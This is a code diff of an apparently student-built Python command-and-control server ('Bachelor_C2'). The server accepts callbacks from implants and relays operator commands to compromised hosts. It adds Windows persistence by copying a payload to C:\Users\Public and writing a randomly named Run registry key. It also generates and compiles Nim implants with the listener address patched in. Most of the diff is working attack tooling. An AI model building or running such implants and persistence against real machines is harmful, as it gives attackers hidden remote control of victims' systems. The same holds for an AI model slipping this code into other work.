@@ -13,6 +13,7 @@ import struct
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import http.server
 import base64
+import randomname
 def banner():
     print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
     print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
@@ -50,6 +51,7 @@ def listener_handler(): # Function to handle incoming connections and send bytes
     print(f'[+] Awaiting callback from implants on {host_ip}:{host_port}')
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
+    t1.daemon = True
     t1.start()
     
 
@@ -63,9 +65,14 @@ def comm_in(target_id):
     return response
 
 def comm_out(target_id, message):
-    message = str(message)
-    message = base64.b64encode(bytes(message, encoding='utf-8'))
-    target_id.send(message)
+    message = str(message + '\n')
+    #message = base64.b64encode(bytes(message, encoding='utf-8'))
+    #target_id.send(message)
+    target_id.send(message.encode())
+    
+    
+
+    
 
 def kill_signal(target_id, message):
     message = str(message)
@@ -74,30 +81,33 @@ def kill_signal(target_id, message):
 
 def target_comm(target_id, targets, num):
     while True:
-        message = input(f'{targets[num][3]}/{targets[num][1]}#> ')
+        message = input(f'{targets[num][3]}/{targets[num][1]}#> ') + '\n'
         if len(message) == 0:
             continue
         if message == 'help':
             pass
         else:
             comm_out(target_id, message)
-            if message == 'exit':
-                message = base64.b64encode(message.encode())
+            if message == 'exit\n':
+                #message = base64.b64encode(message.encode())
                 target_id.send(message.encode())
                 target_id.close()
                 targets[num][7] = 'Dead'
                 break
-            if message == 'background':
+            if message == 'background\n':
                 break
-            if message == 'persist':
+            if message == 'persist\n':
                 payload_n = input('[+] Enter the name of the payload to add to persist: ')
                 if targets[num] [6] == 1:
-                    persist1 = f'cmd.exe /c copy {payload_n} C:\\Users\\Public'
-                    persist1 = base64.b64encode(persist1.encode())
-                    target_id.send(persist1.encode())
-                    persist2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\Public\\{payload_n}'
-                    persist2 = base64.b64encode(persist2.encode())
-                    target_id.send(persist2.encode())
+                    ran_name = randomname.get_name()
+                    persist1 = f'copy {payload_n} C:\\Users\\Public'
+                    #persist1 = base64.b64encode(persist1.encode())
+                    #target_id.send(persist1.encode())
+                    comm_out(target_id, persist1) 
+                    persist2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /t REG_SZ /d C:\\Users\Public\\{payload_n}'
+                    #persist2 = base64.b64encode(persist2.encode())
+                    #target_id.send(persist2.encode())
+                    comm_out(target_id, persist2)
                     print('[+] Run the following command to cleanup the registry key: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /f')
                     print('[+] The persistance technique has completed')
                 if targets[num][6] == 2:
@@ -121,9 +131,9 @@ def comm_handler():
             break
         try:
             remote_target, remote_ip = sock.accept()
-            username = remote_target.recv(1024).decode()
+            username = remote_target.recv(4096).decode()
             username = base64.b64decode(username).decode()
-            admin = remote_target.recv(1024).decode()
+            admin = remote_target.recv(4096).decode()
             admin = base64.b64decode(admin).decode()
             operating_system = remote_target.recv(4096).decode()
             operating_system = base64.b64decode(operating_system).decode()
@@ -133,7 +143,7 @@ def comm_handler():
                 admin_value = 'Yes'
             else:
                 admin_value = 'No'
-            if 'Windows' in operating_system:
+            if 'windows' in operating_system:
                 pay_val = 1
             else:
                 pay_val = 2
@@ -203,40 +213,37 @@ def linplant():
     if os.path.exists(py_loc):
         print(f'{f_name} saved to {implant_loc}')
 
-def winPYexe():
-    random_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
-    f_name= f'{random_name}.py'
+def nimplant():
+    random_name = randomname.get_name()
+    f_name= f'{randomname.get_name()}.nim'
     exe_file = f'{random_name}.exe'
-    file_loc = os.path.expanduser('~/Bachelor_C2/implant/winplant.py')
+    file_loc = os.path.expanduser('~/Bachelor_C2/implant/implant.nim')
     implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
     if os.path.exists(file_loc):
-        shutil.copy('winplant.py', f_name)
+        shutil.copy(file_loc, f_name)
         shutil.move(f_name, implant_loc)
     else:
-        print(f'[-] winplant.py not found in {file_loc}')
-    with open(f_name) as f:
-        patch_host = f.read().replace('INPUT_IP', host_ip)
-    with open(f_name, 'w') as f:
+        print(f'[-] implant.nim not found in {file_loc}')
+    with open(f'{implant_loc}/{f_name}') as f:
+        patch_host = f.read().replace('INPUT_IP', str(host_ip))
+    with open(f'{implant_loc}/{f_name}', 'w') as f:
         f.write(patch_host)
         f.close()
-    with open(f_name) as f:
-        patch_port = f.read().replace('INPUT_PORT', host_port)
-    with open(f_name, 'w') as f:
+    with open(f'{implant_loc}/{f_name}') as f:
+        patch_port = f.read().replace('INPUT_PORT', str(host_port))
+    with open(f'{implant_loc}/{f_name}', 'w') as f:
         f.write(patch_port)
         f.close()
-    exe_file_loc = os.path.join(implant_loc, f_name)
-    pyinstaller_exec = f'pyinstaller "{exe_file_loc}" -w --clean --onefile --distpath .'
-    print(f'[+] Compiling executable {exe_file}. . .')
-    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL, shell=True)
-    os.remove(f'{random_name}.spec')
-    shutil.rmtree('build')
-    shutil.move(exe_file, implant_loc)
-    exe_loc = os.path.join(implant_loc, exe_file)
-    if os.path.exists(exe_loc):
+    compile_cmd = [f"nim", "c", "-d:mingw", "--cpu:amd64", f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
+    print(f'[*] Compiling executeable {exe_file}...')
+    process = subprocess.Popen(compile_cmd)
+    process.wait()
+    implant_loc = os.path.join(implant_loc, exe_file)
+    if os.path.exists(implant_loc):
         print(f'{exe_file} saved to {implant_loc}')
-        shutil.rmtree(f_name)
+        
     else:
-        print('[-] An error occurred while compiling')
+        print('[-] An error occurred while compiling the implant')
 
 def resolve_ip(interface):
     
@@ -332,9 +339,9 @@ if __name__ == '__main__':
                     linplant()
                 else:
                     print('[-] Cannot generate payload without active listener')
-            elif command == 'winPYexe':
+            elif command == 'nimplant':
                 if listener_count > 0:
-                    winPYexe()
+                    nimplant()
                 else:
                     print('[-] Cannot compile payload without active listener')
             if command == 'pwsh_cradle':
